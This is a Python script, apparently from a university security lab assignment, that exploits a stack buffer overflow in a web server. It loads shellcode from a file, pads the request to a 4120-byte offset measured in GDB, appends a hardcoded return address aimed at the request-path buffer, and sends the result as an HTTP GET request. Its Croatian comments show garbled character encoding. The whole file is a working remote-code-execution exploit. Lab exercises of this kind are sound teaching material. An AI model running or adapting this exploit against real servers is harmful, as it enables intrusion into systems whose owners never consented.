#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct

# üîπ Adresa buffer-a reqpath iz GDB-a (gdje ƒáe biti na≈° shellcode)
shellcode_addr =   0x7fffffffdc01          # 0x7fffffffdc00 - potneijclano ne tu jer to poazuje na znak "\"

def build_exploit(shellcode: bytes) -> bytes:
    # Duljina do return adrese je 4120 bajtova (raƒçunato iz GDB-a)
    padding_len = 4120 - len(shellcode) - 1

    # Napravi padding do return adrese
    padding = b"A" * padding_len

    adresa = urllib.parse.quote_from_bytes(struct.pack("<Q", shellcode_addr)).encode("ascii")
    kod = urllib.parse.quote_from_bytes(shellcode).encode("ascii")
    # !!!!!!!!
    # Sastavi HTTP GET zahtjev
    request = b"GET /" + kod + padding + adresa + b" HTTP/1.0\r\n\r\n"
    #request = b"GET /" + exploit + b" HTTP/1.0\r\n\r\n"
    return request

def send_req(host: str, port: int, req: bytes) -> bytes:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp += rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    # üîπ Uƒçitaj shellcode iz .bin datoteke
    with open("shellcode-zad-3.bin", "rb") as f:
        shellcode = f.read()

    # Napravi exploit request
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req[:200], b"...")  # samo prvi dio ispi≈°i

    # Po≈°alji zahtjev
    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
 
